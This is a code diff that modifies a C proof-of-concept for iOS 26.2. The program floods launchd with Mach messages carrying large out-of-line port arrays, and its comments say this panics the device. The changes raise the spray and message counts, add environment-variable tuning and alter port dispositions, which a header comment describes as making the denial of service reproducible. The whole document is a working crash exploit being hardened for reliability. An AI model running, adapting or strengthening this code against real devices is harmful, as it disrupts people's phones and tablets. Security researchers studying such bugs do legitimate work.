@@ -1,8 +1,9 @@
 /*
- * (useless) poc.c
- * works on iOS 26.2 (23C55)
- * doesn't work on sim i don't know why
- * Jian Lee (@speedyfriend433)
+ * poc.c
+ * Works on iOS 26.2 (23C55); sim usually not affected.
+ * Tested on: iPhone 15 Plus (26.2), iPad (18.0)
+ * Original: Jian Lee (@speedyfriend433)
+ * Stability tweaks for reproducible DoS: yousef (yousef_dev921)
  */
 
 #include <stdio.h>
@@ -12,8 +13,9 @@
 //#include "bootstrap.h"
 //#include <mach/task_special_ports.h>
 
-#define PORT_COUNT 67 // 67 was enough to trigger -> hack different server won't like this xd
-/// set this to 478 if default didn't work
+#define DEFAULT_PORT_COUNT 2048 // larger spray by default; override with PORT_COUNT env
+#define DEFAULT_MSG_COUNT 1200  // number of mach_msg sends; override with MSG_COUNT env
+/// prior values (e.g. 67/478) may be too small on some devices
 
 typedef struct {
     mach_msg_header_t header;
@@ -24,19 +26,31 @@ typedef struct {
 
 int main(void) {
     kern_return_t kr;
-    printf("port array (%lu bytes)...\n", sizeof(mach_port_t) * PORT_COUNT);
-    mach_port_t *ports = malloc(sizeof(mach_port_t) * PORT_COUNT);
+    const char *port_count_env = getenv("PORT_COUNT");
+    const char *msg_count_env = getenv("MSG_COUNT");
+    size_t port_count = port_count_env ? strtoul(port_count_env, NULL, 0) : DEFAULT_PORT_COUNT;
+    size_t msg_count = msg_count_env ? strtoul(msg_count_env, NULL, 0) : DEFAULT_MSG_COUNT;
+
+    if (port_count == 0 || port_count > 16000) { // keep under IPC_KMSG_MAX_OOL_PORT_COUNT (~16383)
+        port_count = DEFAULT_PORT_COUNT;
+    }
+    if (msg_count == 0) {
+        msg_count = DEFAULT_MSG_COUNT;
+    }
+
+    printf("port array (%zu bytes)...\n", sizeof(mach_port_t) * port_count);
+    mach_port_t *ports = calloc(port_count, sizeof(mach_port_t));
     mach_port_t fake_port;
     mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fake_port);
 //    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fake_port);
 //    mach_port_deallocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE)
     mach_port_insert_right(mach_task_self(), fake_port, fake_port, MACH_MSG_TYPE_MAKE_SEND);
     
-    for (int i = 0; i < PORT_COUNT; i++) {
+    for (size_t i = 0; i < port_count; i++) {
         ports[i] = fake_port;
     }
 
-    panic_msg_t msg;
+    panic_msg_t msg = {0};
     
     msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
     msg.header.msgh_size = sizeof(panic_msg_t);
@@ -57,10 +71,10 @@ int main(void) {
     msg.header.msgh_id = 0x67676767;
     msg.body.msgh_descriptor_count = 1;
     msg.ool_ports.address = (void *)ports;
-    msg.ool_ports.count = PORT_COUNT;
+    msg.ool_ports.count = (mach_msg_type_number_t)port_count;
     msg.ool_ports.deallocate = FALSE;
     msg.ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
-    msg.ool_ports.disposition = MACH_MSG_TYPE_MAKE_SEND;
+    msg.ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
     msg.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
 //    MACH_MSG_TYPE_MAKE_SEND; O
 //    MACH_MSG_TYPE_COPY_SEND; X
@@ -75,7 +89,7 @@ int main(void) {
     
     printf("good bye launchd\n");
     
-    for (int i = 0; i < 670; i++) { // after hundreds of attempts, figured out that 670 was enough
+    for (size_t i = 0; i < msg_count; i++) {
         kr = mach_msg(
             &msg.header,
             MACH_SEND_MSG,
@@ -87,7 +101,7 @@ int main(void) {
         );
         
         if (kr != KERN_SUCCESS) {
-            // printf("[-] Send failed: 0x%x\n", kr);
+            if (i % 100 == 0) printf("[-] send failed: 0x%x at %zu\n", kr, i);
         } else {
             if (i % 100 == 0) printf("."); // pretty sure device will panic after 2~3 seconds if apple didn't patch it
                                             /// i think apple will patch this in iOS 26.3 since i open sourced it
